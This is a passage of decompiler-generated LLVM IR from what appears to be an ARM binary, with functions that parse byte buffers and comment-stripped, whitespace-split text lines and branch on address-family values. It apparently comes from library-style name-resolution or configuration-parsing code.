  store i32 %v1_14604, i32* @r5, align 4
  %v6_14604 = icmp slt i32 %v1_14604, 0
  store i32 %v2_145d0, i32* %r0.global-to-local, align 4
  %v0_1460c = load i32, i32* @sl, align 4
  %v2_1460c = add i32 %v0_1460c, %v2_145f4
  store i32 %v2_1460c, i32* @r4, align 4
  br i1 %v6_14604, label %bb, label %dec_label_pc_14618

bb:                                               ; preds = %dec_label_pc_14604
  br label %bb14

dec_label_pc_14618:                               ; preds = %dec_label_pc_14604
  %v1_14618 = call i32 @function_f4e0(i32 %v2_145d0)
  store i32 %v1_14618, i32* %r0.global-to-local, align 4
  %v1_1461c = load i32, i32* @r6, align 4
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  store i32 %v1_14618, i32* %v2_1461c, align 4
  %v0_14620 = load i32, i32* @sl, align 4
  %v1_14620 = load i32, i32* %r8.global-to-local, align 4
  %v2_14620 = add i32 %v1_14620, %v0_14620
  %v3_14620 = inttoptr i32 %v2_14620 to i8*
  %v4_14620 = load i8, i8* %v3_14620, align 1
  %v6_14620 = zext i8 %v4_14620 to i32
  %v0_14624 = load i32, i32* @r4, align 4
  %v1_14624 = add i32 %v0_14624, 1
  %v2_14624 = inttoptr i32 %v1_14624 to i8*
  %v3_14624 = load i8, i8* %v2_14624, align 1
  %v4_14624 = zext i8 %v3_14624 to i32
  %v4_14628 = mul nuw nsw i32 %v6_14620, 256
  %v5_14628 = or i32 %v4_14624, %v4_14628
  store i32 %v5_14628, i32* %r3.global-to-local, align 4
  %v1_1462c = load i32, i32* @r6, align 4
  %v2_1462c = add i32 %v1_1462c, 4
  %v3_1462c = inttoptr i32 %v2_1462c to i32*
  store i32 %v5_14628, i32* %v3_1462c, align 4
  %v0_14630 = load i32, i32* @r4, align 4
  %v1_14630 = add i32 %v0_14630, 2
  store i32 %v1_14630, i32* %r1.global-to-local, align 4
  %v2_14634 = inttoptr i32 %v1_14630 to i8*
  %v3_14634 = load i8, i8* %v2_14634, align 1
  %v4_14634 = zext i8 %v3_14634 to i32
  %v1_14638 = add i32 %v0_14630, 3
  %v2_14638 = inttoptr i32 %v1_14638 to i8*
  %v3_14638 = load i8, i8* %v2_14638, align 1
  %v4_14638 = zext i8 %v3_14638 to i32
  %v4_1463c = mul nuw nsw i32 %v4_14634, 256
  %v5_1463c = or i32 %v4_14638, %v4_1463c
  store i32 %v5_1463c, i32* %r3.global-to-local, align 4
  %v1_14640 = load i32, i32* @r6, align 4
  %v2_14640 = add i32 %v1_14640, 8
  %v3_14640 = inttoptr i32 %v2_14640 to i32*
  store i32 %v5_1463c, i32* %v3_14640, align 4
  %v0_14644 = load i32, i32* %r1.global-to-local, align 4
  %v1_14644 = add i32 %v0_14644, 2
  %v1_14648 = add i32 %v0_14644, 3
  %v2_14648 = inttoptr i32 %v1_14648 to i8*
  %v3_14648 = load i8, i8* %v2_14648, align 1
  %v4_14648 = zext i8 %v3_14648 to i32
  store i32 %v4_14648, i32* %r3.global-to-local, align 4
  %v2_1464c = inttoptr i32 %v1_14644 to i8*
  %v3_1464c = load i8, i8* %v2_1464c, align 1
  %v4_1464c = zext i8 %v3_1464c to i32
  store i32 %v4_1464c, i32* %r0.global-to-local, align 4
  %v1_14650 = add i32 %v0_14644, 5
  %v2_14650 = inttoptr i32 %v1_14650 to i8*
  %v3_14650 = load i8, i8* %v2_14650, align 1
  %v4_14650 = zext i8 %v3_14650 to i32
  %v3_14654 = mul nuw nsw i32 %v4_14648, 65536
  store i32 %v3_14654, i32* %r3.global-to-local, align 4
  %v1_14658 = add i32 %v0_14644, 4
  %v2_14658 = inttoptr i32 %v1_14658 to i8*
  %v3_14658 = load i8, i8* %v2_14658, align 1
  %v4_14658 = zext i8 %v3_14658 to i32
  %v4_1465c = mul nuw i32 %v4_1464c, 16777216
  %v5_1465c = or i32 %v4_1465c, %v3_14654
  %v2_14660 = or i32 %v5_1465c, %v4_14650
  %v4_14664 = mul nuw nsw i32 %v4_14658, 256
  %v5_14664 = or i32 %v2_14660, %v4_14664
  store i32 %v5_14664, i32* %r3.global-to-local, align 4
  %v1_14668 = load i32, i32* @r6, align 4
  %v2_14668 = add i32 %v1_14668, 12
  %v3_14668 = inttoptr i32 %v2_14668 to i32*
  store i32 %v5_14664, i32* %v3_14668, align 4
  %v0_1466c = load i32, i32* %r1.global-to-local, align 4
  %v1_1466c = add i32 %v0_1466c, 6
  %v2_1466c = inttoptr i32 %v1_1466c to i8*
  %v3_1466c = load i8, i8* %v2_1466c, align 1
  %v4_1466c = zext i8 %v3_1466c to i32
  %v0_14670 = load i32, i32* @r4, align 4
  %v1_14670 = add i32 %v0_14670, 9
  %v2_14670 = inttoptr i32 %v1_14670 to i8*
  %v3_14670 = load i8, i8* %v2_14670, align 1
  %v4_14670 = zext i8 %v3_14670 to i32
  %v1_14674 = add i32 %v0_14670, 10
  store i32 %v1_14674, i32* %r0.global-to-local, align 4
  %v4_14678 = mul nuw nsw i32 %v4_1466c, 256
  %v5_14678 = or i32 %v4_14670, %v4_14678
  store i32 %v5_14678, i32* %r3.global-to-local, align 4
  %v0_1467c = load i32, i32* %r8.global-to-local, align 4
  %v1_1467c = add i32 %v0_1467c, 10
  %v0_14680 = load i32, i32* @r5, align 4
  %v1_14684 = add nuw nsw i32 %v5_14678, 10
  store i32 %v1_14684, i32* %r1.global-to-local, align 4
  %v1_14688 = load i32, i32* @r6, align 4
  %v2_14688 = add i32 %v1_14688, 24
  %v3_14688 = inttoptr i32 %v2_14688 to i32*
  store i32 %v1_1467c, i32* %v3_14688, align 4
  %v0_1468c = load i32, i32* %r0.global-to-local, align 4
  %v1_1468c = load i32, i32* @r6, align 4
  %v2_1468c = add i32 %v1_1468c, 20
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  store i32 %v0_1468c, i32* %v3_1468c, align 4
  %v0_14690 = load i32, i32* %r3.global-to-local, align 4
  %v1_14690 = load i32, i32* @r6, align 4
  %v2_14690 = add i32 %v1_14690, 16
  %v3_14690 = inttoptr i32 %v2_14690 to i32*
  store i32 %v0_14690, i32* %v3_14690, align 4
  %v0_14694 = load i32, i32* @r7, align 4
  %v1_14694 = load i32, i32* %r1.global-to-local, align 4
  %v2_14694 = add i32 %v1_14694, %v0_14694
  %v5_14698 = icmp slt i32 %v0_14680, %v5_14678
  %.v2_14694 = select i1 %v5_14698, i32 -1, i32 %v2_14694
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_14618, %dec_label_pc_145cc
  %v0_1469c = phi i32 [ %.v2_14694, %dec_label_pc_14618 ], [ %v1_14604, %bb ], [ %v0_145ec, %dec_label_pc_145cc ]
  store i32 %v0_1469c, i32* %r0.global-to-local, align 4
  store i32 %v3_145cc, i32* @r4, align 4
  store i32 %v6_145cc, i32* @r5, align 4
  store i32 %v9_145cc, i32* @r6, align 4
  store i32 %v12_145cc, i32* @r7, align 4
  store i32 %v21_145cc, i32* @sl, align 4
  ret i32 %v0_1469c

; uselistorder directives
  uselistorder i32 %v0_1469c, { 1, 0 }
  uselistorder i32 %v5_14678, { 1, 0, 2 }
  uselistorder i32 %v3_14654, { 1, 0 }
  uselistorder i32 %v1_14604, { 0, 2, 1 }
  uselistorder i32 %v0_145ec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 0 }
  uselistorder i32 20, { 21, 22, 23, 31, 0, 24, 34, 3, 35, 1, 4, 32, 7, 25, 26, 16, 8, 18, 2, 9, 27, 28, 29, 30, 17, 33, 10, 19, 11, 6, 5, 12, 20, 13, 14, 15 }
  uselistorder i32 24, { 4, 5, 6, 8, 7, 0, 16, 17, 18, 9, 2, 22, 1, 19, 10, 11, 12, 13, 14, 15, 3, 20, 21 }
  uselistorder i32 9, { 6, 7, 8, 9, 10, 0, 18, 1, 11, 12, 2, 13, 4, 14, 15, 16, 17, 3, 5 }
  uselistorder i32 6, { 11, 12, 13, 7, 8, 14, 15, 1, 2, 3, 17, 4, 5, 16, 0, 6, 9, 10 }
  uselistorder i32 5, { 1, 13, 14, 15, 8, 4, 2, 9, 3, 0, 16, 17, 5, 10, 11, 12, 6, 7 }
  uselistorder i32 (i32)* @function_f4e0, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @function_146a8() local_unnamed_addr {
dec_label_pc_146a8:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_17508.590 to i32), i32* @r1, align 4
  %v0_146ac = load i32, i32* @lr, align 4
  store i32 %v0_146ac, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1756c.624 to i32), i32* @r0, align 4
  %v3_146b4 = call i32 @function_d050(i32 ptrtoint ([11 x i8]* @global_var_1756c.624 to i32), i32 ptrtoint (i32* @global_var_17508.590 to i32))
  %v2_146b8 = icmp eq i32 %v3_146b4, 0
  store i32 ptrtoint (i32* @global_var_17508.590 to i32), i32* @r1, align 4
  br i1 %v2_146b8, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_146a8
  ret i32 %v3_146b4

bb2:                                              ; preds = %dec_label_pc_146a8
  store i32 ptrtoint ([18 x i8]* @global_var_17578.626 to i32), i32* @r0, align 4
  %v2_146c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_146c8, i32* @lr, align 4
  %v3_146cc = call i32 @function_d050(i32 ptrtoint ([18 x i8]* @global_var_17578.626 to i32), i32 ptrtoint (i32* @global_var_17508.590 to i32))
  ret i32 %v3_146cc

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_d050, { 8, 4, 3, 2, 7, 6, 5, 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_17508.590 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @function_146dc() local_unnamed_addr {
dec_label_pc_146dc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_146dc = load i32, i32* @r4, align 4
  %v6_146dc = load i32, i32* @r5, align 4
  %v12_146dc = load i32, i32* @r7, align 4
  %v15_146dc = load i32, i32* @r8, align 4
  %v21_146dc = load i32, i32* @sl, align 4
  %v24_146dc = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_146e8 = sub i32 0, %tmp61
  %v1_146ec = urem i32 %v1_146e8, 4
  store i32 %v1_146ec, i32* %ip.global-to-local, align 4
  %v2_146ec = icmp eq i32 %v1_146ec, 0
  %v0_146f0 = load i32, i32* @r2, align 4
  %v0_146f4 = load i32, i32* @r0, align 4
  %v0_146f8 = load i32, i32* @r1, align 4
  %v0_146fc = load i32, i32* @r3, align 4
  store i32 %v0_146fc, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_146ec, label %dec_label_pc_1471c, label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_146dc
  %v2_1470c = sub i32 %tmp57, %v1_146ec
  %v3_1470c = icmp ult i32 %tmp57, %v1_146ec
  br i1 %v3_1470c, label %dec_label_pc_149f0, label %dec_label_pc_14714

dec_label_pc_14714:                               ; preds = %dec_label_pc_1470c
  store i32 %v2_1470c, i32* %r2.global-to-local, align 4
  %v2_14718 = add i32 %v1_146ec, %tmp61
  store i32 %v2_14718, i32* @r4, align 4
  br label %dec_label_pc_1471c

dec_label_pc_1471c:                               ; preds = %dec_label_pc_146dc, %dec_label_pc_14714
  %v0_1472c = phi i32 [ %tmp61, %dec_label_pc_146dc ], [ %v2_14718, %dec_label_pc_14714 ]
  %v0_14730 = phi i32 [ %tmp57, %dec_label_pc_146dc ], [ %v2_1470c, %dec_label_pc_14714 ]
  %tmp = icmp ult i32 %v0_14730, 32
  br i1 %tmp, label %dec_label_pc_149f0, label %dec_label_pc_14724

dec_label_pc_14724:                               ; preds = %dec_label_pc_1471c
  store i32 %v0_146fc, i32* %r0.global-to-local, align 4
  %v7_14728 = icmp eq i32 %v0_146fc, 1
  %v1_1472c = add i32 %v0_1472c, 32
  store i32 %v1_1472c, i32* @fp, align 4
  %v1_14730 = add i32 %v0_14730, -32
  store i32 %v1_14730, i32* @r8, align 4
  br i1 %v7_14728, label %dec_label_pc_1485c, label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_14724
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_14744 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_14744, align 4
  %tmp80 = icmp ult i32 %v1_14730, 4
  br i1 %tmp80, label %dec_label_pc_149f0, label %dec_label_pc_1474c

dec_label_pc_1474c:                               ; preds = %dec_label_pc_14738
  %v0_1474c = load i32, i32* %r2.global-to-local, align 4
  %v1_1474c = add i32 %v0_1474c, -36
  store i32 %v1_1474c, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1474c, 8
  br i1 %tmp81, label %dec_label_pc_149f0, label %dec_label_pc_14758

dec_label_pc_14758:                               ; preds = %dec_label_pc_1474c
  %v0_14758 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_14758, 16
  br i1 %tmp82, label %dec_label_pc_149f0, label %dec_label_pc_14760

dec_label_pc_14760:                               ; preds = %dec_label_pc_14758
  %v1_14760 = add i32 %v0_1474c, -48
  store i32 %v1_14760, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_14760, 8
  br i1 %tmp83, label %dec_label_pc_149f0, label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14760
  %v1_1476c = add i32 %v0_1474c, -44
  store i32 %v1_1476c, i32* @r8, align 4
  %v1_14770 = add i32 %v0_1474c, -56
  store i32 %v1_14770, i32* %r3.global-to-local, align 4
  %v3_14774 = icmp ult i32 %v1_14770, %v1_1476c
  br i1 %v3_14774, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1476c
  %v1_1477c = load i32, i32* @r4, align 4
  %v2_1477c = add i32 %v1_1477c, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1476c
  store i32 %v1_14770, i32* @r8, align 4
  %v1_14780.pre = load i32, i32* @r4, align 4
  %v2_14780 = add i32 %v1_14780.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_14780, %.thread1 ], [ %v2_1477c, %bb ]
  %v0_14788 = phi i32 [ %v1_14780.pre, %.thread1 ], [ %v1_1477c, %bb ]
  %v0_14784 = phi i32 [ %v1_14770, %.thread1 ], [ %v1_1476c, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_14788 = add i32 %v0_14788, 36
  store i32 %v1_14788, i32* @r6, align 4
  %v1_1478c = add i32 %v0_14788, 48
  store i32 %v1_1478c, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_14784, 80
  br i1 %tmp84, label %dec_label_pc_149f0, label %dec_label_pc_14794

dec_label_pc_14794:                               ; preds = %bb74
  %v0_14794 = call i32 @function_146a8()
  store i32 %v0_14794, i32* %r0.global-to-local, align 4
  %v2_14798 = icmp eq i32 %v0_14794, 0
  br i1 %v2_14798, label %dec_label_pc_147b4, label %.thread

.thread:                                          ; preds = %dec_label_pc_14794
  %v1_147a0 = load i32, i32* @fp, align 4
  store i32 %v1_147a0, i32* @r7, align 4
  %v1_147a4 = load i32, i32* @r5, align 4
  store i32 %v1_147a4, i32* @fp, align 4
  %v1_147a8 = load i32, i32* @r6, align 4
  %v1_147ac = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14868

dec_label_pc_147b4:                               ; preds = %dec_label_pc_14794
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_147bc = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_147bc, align 4
  %v0_147c0 = call i32 @function_cec4()
  store i32 %v0_147c0, i32* %r0.global-to-local, align 4
  %v1_147c4 = inttoptr i32 %v0_147c0 to i32*
  %v2_147c4 = load i32, i32* %v1_147c4, align 4
  store i32 %v2_147c4, i32* @sl, align 4
  br label %dec_label_pc_149f4

dec_label_pc_147cc:                               ; preds = %dec_label_pc_1497c
  %v0_147cc = load i32, i32* @r4, align 4
  %v1_147cc = add i32 %v0_147cc, 4
  %v2_147cc = inttoptr i32 %v1_147cc to i32*
  %v3_147cc = load i32, i32* %v2_147cc, align 4
  %v1_147d0 = load i32, i32* @sb, align 4
  %v2_147d0 = inttoptr i32 %v1_147d0 to i32*
  store i32 %v3_147cc, i32* %v2_147d0, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_147e4 = load i32, i32* @r4, align 4
  %v1_147e4 = add i32 %v0_147e4, 8
  store i32 %v1_147e4, i32* %r1.global-to-local, align 4
  %v1_147e8 = load i32, i32* @sb, align 4
  %v2_147e8 = add i32 %v1_147e8, 8
  %v3_147e8 = inttoptr i32 %v2_147e8 to i32*
  store i32 2, i32* %v3_147e8, align 4
  %v0_147ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_147ec, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_147f4 = load i32, i32* @sb, align 4
  %v1_147f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_147f4 = inttoptr i32 %v1_147f4 to i32*
  store i32 %v0_147f4, i32* %v2_147f4, align 4
  %v0_147f8 = load i32, i32* @r7, align 4
  %v1_147f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_147f8 = inttoptr i32 %v1_147f8 to i32*
  store i32 %v0_147f8, i32* %v2_147f8, align 4
  %v0_147fc = load i32, i32* %r3.global-to-local, align 4
  %v1_147fc = load i32, i32* @sb, align 4
  %v2_147fc = add i32 %v1_147fc, 12
  %v3_147fc = inttoptr i32 %v2_147fc to i32*
  store i32 %v0_147fc, i32* %v3_147fc, align 4
  %v0_14800 = load i32, i32* %r0.global-to-local, align 4
  %v1_14800 = load i32, i32* @sb, align 4
  %v2_14800 = add i32 %v1_14800, 16
  %v3_14800 = inttoptr i32 %v2_14800 to i32*
  store i32 %v0_14800, i32* %v3_14800, align 4
  %v0_14804 = load i32, i32* %r1.global-to-local, align 4
  %v1_14804 = load i32, i32* @sb, align 4
  %v2_14804 = add i32 %v1_14804, 4
  %v3_14804 = inttoptr i32 %v2_14804 to i32*
  store i32 %v0_14804, i32* %v3_14804, align 4
  %v0_14808 = load i32, i32* %r2.global-to-local, align 4
  %v1_14808 = load i32, i32* %r0.global-to-local, align 4
  %v2_14808 = add i32 %v1_14808, 4
  %v3_14808 = inttoptr i32 %v2_14808 to i32*
  store i32 %v0_14808, i32* %v3_14808, align 4
  br label %dec_label_pc_149d8

dec_label_pc_14810:                               ; preds = %dec_label_pc_149a4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_14814 = load i32, i32* @r4, align 4
  %v1_14814 = add i32 %v0_14814, 4
  %v2_14814 = inttoptr i32 %v1_14814 to i32*
  %v3_14814 = load i32, i32* %v2_14814, align 4
  store i32 %v3_14814, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1481c = load i32, i32* @sb, align 4
  %v2_1481c = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1481c, i32* %v2_1481c, align 4
  store i32 %v0_14874, i32* %ip.global-to-local, align 4
  %v0_14824 = load i32, i32* %r3.global-to-local, align 4
  %v1_14824 = load i32, i32* @sb, align 4
  %v2_14824 = inttoptr i32 %v1_14824 to i32*
  store i32 %v0_14824, i32* %v2_14824, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_14830 = load i32, i32* %ip.global-to-local, align 4
  %v1_14830 = load i32, i32* %r0.global-to-local, align 4
  %v2_14830 = inttoptr i32 %v1_14830 to i32*
  store i32 %v0_14830, i32* %v2_14830, align 4
  %v0_14834 = load i32, i32* %r3.global-to-local, align 4
  %v1_14834 = load i32, i32* @sb, align 4
  %v2_14834 = add i32 %v1_14834, 12
  %v3_14834 = inttoptr i32 %v2_14834 to i32*
  store i32 %v0_14834, i32* %v3_14834, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_14840 = load i32, i32* @r4, align 4
  %v1_14840 = add i32 %v0_14840, 8
  store i32 %v1_14840, i32* %r1.global-to-local, align 4
  %v0_14844 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14844, i32* @sl, align 4
  %v1_14848 = load i32, i32* @sb, align 4
  %v2_14848 = add i32 %v1_14848, 8
  %v3_14848 = inttoptr i32 %v2_14848 to i32*
  store i32 10, i32* %v3_14848, align 4
  %v0_1484c = load i32, i32* %r3.global-to-local, align 4
  %v1_1484c = load i32, i32* @sb, align 4
  %v2_1484c = add i32 %v1_1484c, 16
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v0_1484c, i32* %v3_1484c, align 4
  %v0_14850 = load i32, i32* %r1.global-to-local, align 4
  %v1_14850 = load i32, i32* @sb, align 4
  %v2_14850 = add i32 %v1_14850, 4
  %v3_14850 = inttoptr i32 %v2_14850 to i32*
  store i32 %v0_14850, i32* %v3_14850, align 4
  %v0_14854 = load i32, i32* %r2.global-to-local, align 4
  %v1_14854 = load i32, i32* %r3.global-to-local, align 4
  %v2_14854 = add i32 %v1_14854, 4
  %v3_14854 = inttoptr i32 %v2_14854 to i32*
  store i32 %v0_14854, i32* %v3_14854, align 4
  br label %dec_label_pc_149d8

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14724
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %.thread, %dec_label_pc_1485c
  %v2_14878.pre-phi = phi i32* [ %v2_14744, %.thread ], [ %.pre, %dec_label_pc_1485c ]
  %v0_14874 = phi i32 [ %v1_147a0, %.thread ], [ 0, %dec_label_pc_1485c ]
  %stack_var_-40.1 = phi i32 [ %v1_147ac, %.thread ], [ 0, %dec_label_pc_1485c ]
  %stack_var_-48.1 = phi i32 [ %v1_147a8, %.thread ], [ 0, %dec_label_pc_1485c ]
  %stack_var_-52.0 = phi i32 [ %v0_14794, %.thread ], [ %v0_146f4, %dec_label_pc_1485c ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_14878.pre-phi, align 4
  %v2_1493c = inttoptr i32 %v0_146f8 to i8*
  %v7_14974 = icmp eq i32 %v0_146f0, 2
  %v7_1499c = icmp eq i32 %v0_146f0, 10
  br label %dec_label_pc_149c0

dec_label_pc_14880:                               ; preds = %dec_label_pc_149c0
  %v0_14880 = load i32, i32* @fp, align 4
  store i32 %v0_14880, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_14888 = call i32 @function_14ac8(i32 %v0_14880, i32 35)
  store i32 %v2_14888, i32* %r0.global-to-local, align 4
  %v3_1488c = icmp eq i32 %v2_14888, 0
  br i1 %v3_1488c, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_14880
  %v0_1489411 = load i32, i32* @fp, align 4
  store i32 %v0_1489411, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14900.preheader

bb75:                                             ; preds = %dec_label_pc_14880
  %v3_14888 = inttoptr i32 %v2_14888 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14894 = load i32, i32* @fp, align 4
  store i32 %v0_14894, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_14888, align 1
  %v0_1490030.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14900.preheader

dec_label_pc_14900.preheader:                     ; preds = %bb75, %.thread10
  %v0_1490030 = phi i32 [ %v0_1490030.pre, %bb75 ], [ %v0_1489411, %.thread10 ]
  %v1_1490031 = inttoptr i32 %v0_1490030 to i8*
  %v2_1490032 = load i8, i8* %v1_1490031, align 1
  %v3_1490033 = zext i8 %v2_1490032 to i32
  store i32 %v3_1490033, i32* %r3.global-to-local, align 4
  %v2_1490434 = icmp eq i8 %v2_1490032, 0
  br i1 %v2_1490434, label %dec_label_pc_1490c, label %dec_label_pc_148ac.preheader

dec_label_pc_148a4:                               ; preds = %dec_label_pc_148b8
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_148a8 = inttoptr i32 %v8_148d0 to i8*
  store i8 0, i8* %v3_148a8, align 1
  %v4_148a8 = load i32, i32* %r2.global-to-local, align 4
  %v5_148a8 = add i32 %v4_148a8, 1
  store i32 %v5_148a8, i32* %r2.global-to-local, align 4
  %v1_148ac = inttoptr i32 %v5_148a8 to i8*
  %v2_148ac = load i8, i8* %v1_148ac, align 1
  %v3_148ac = zext i8 %v2_148ac to i32
  store i32 %v3_148ac, i32* %r1.global-to-local, align 4
  %v2_148b0 = icmp eq i8 %v2_148ac, 0
  br i1 %v2_148b0, label %dec_label_pc_1490c, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %dec_label_pc_148ac.preheader, %dec_label_pc_148a4
  %v8_148d0 = phi i32 [ %v5_148a8, %dec_label_pc_148a4 ], [ %v0_148ac20, %dec_label_pc_148ac.preheader ]
  %v1_148c0 = phi i32 [ %v3_148ac, %dec_label_pc_148a4 ], [ %v3_148ac23, %dec_label_pc_148ac.preheader ]
  %v2_148bc = load i32, i32* @global_var_18428, align 4
  store i32 %v2_148bc, i32* %r3.global-to-local, align 4
  %v3_148c0 = mul nuw nsw i32 %v1_148c0, 2
  %v4_148c0 = add i32 %v3_148c0, %v2_148bc
  %v5_148c0 = inttoptr i32 %v4_148c0 to i8*
  %v6_148c0 = load i8, i8* %v5_148c0, align 1
  %v8_148c0 = zext i8 %v6_148c0 to i32
  store i32 %v8_148c0, i32* %r3.global-to-local, align 4
  %v1_148c4 = and i32 %v8_148c0, 32
  %v2_148c4 = icmp eq i32 %v1_148c4, 0
  br i1 %v2_148c4, label %dec_label_pc_148cc, label %dec_label_pc_148a4

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148b8
  %v0_148cc = load i32, i32* @r6, align 4
  %v7_148d0 = icmp slt i32 %v0_148cc, 7
  br i1 %v7_148d0, label %bb76, label %dec_label_pc_148e0.preheader

bb76:                                             ; preds = %dec_label_pc_148cc
  %v9_148d0 = load i32, i32* @r4, align 4
  %v13_148d0 = mul i32 %v0_148cc, 4
  %v14_148d0 = add i32 %v9_148d0, %v13_148d0
  %v15_148d0 = inttoptr i32 %v14_148d0 to i32*
  store i32 %v8_148d0, i32* %v15_148d0, align 4
  %v8_148d4 = load i32, i32* @r6, align 4
  %v9_148d4 = add i32 %v8_148d4, 1
  store i32 %v9_148d4, i32* @r6, align 4
  %v0_148e025.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148e0.preheader

dec_label_pc_148e0.preheader:                     ; preds = %bb76, %dec_label_pc_148cc
  %v0_148e025 = phi i32 [ %v0_148e025.pre, %bb76 ], [ %v8_148d0, %dec_label_pc_148cc ]
  %v1_148e026 = inttoptr i32 %v0_148e025 to i8*
  %v2_148e027 = load i8, i8* %v1_148e026, align 1
  %v3_148e028 = zext i8 %v2_148e027 to i32
  store i32 %v3_148e028, i32* %r1.global-to-local, align 4
  %v2_148e429 = icmp eq i8 %v2_148e027, 0
  br i1 %v2_148e429, label %dec_label_pc_14900.loopexit, label %dec_label_pc_148ec.lr.ph

dec_label_pc_148ec.lr.ph:                         ; preds = %dec_label_pc_148e0.preheader
  %v2_148f0.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_148ec

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148ec
  %v1_148dc = add i32 %v0_148dc, 1
  store i32 %v1_148dc, i32* %r2.global-to-local, align 4
  %v1_148e0 = inttoptr i32 %v1_148dc to i8*
  %v2_148e0 = load i8, i8* %v1_148e0, align 1
  %v3_148e0 = zext i8 %v2_148e0 to i32
  store i32 %v3_148e0, i32* %r1.global-to-local, align 4
  %v2_148e4 = icmp eq i8 %v2_148e0, 0
  br i1 %v2_148e4, label %dec_label_pc_14900.loopexit, label %dec_label_pc_148ec

dec_label_pc_148ec:                               ; preds = %dec_label_pc_148ec.lr.ph, %dec_label_pc_148dc
  %v0_148dc = phi i32 [ %v0_148e025, %dec_label_pc_148ec.lr.ph ], [ %v1_148dc, %dec_label_pc_148dc ]
  %v1_148f4 = phi i32 [ %v3_148e028, %dec_label_pc_148ec.lr.ph ], [ %v3_148e0, %dec_label_pc_148dc ]
  store i32 %v2_148f0.pre, i32* %r3.global-to-local, align 4
  %v3_148f4 = mul nuw nsw i32 %v1_148f4, 2
  %v4_148f4 = add i32 %v3_148f4, %v2_148f0.pre
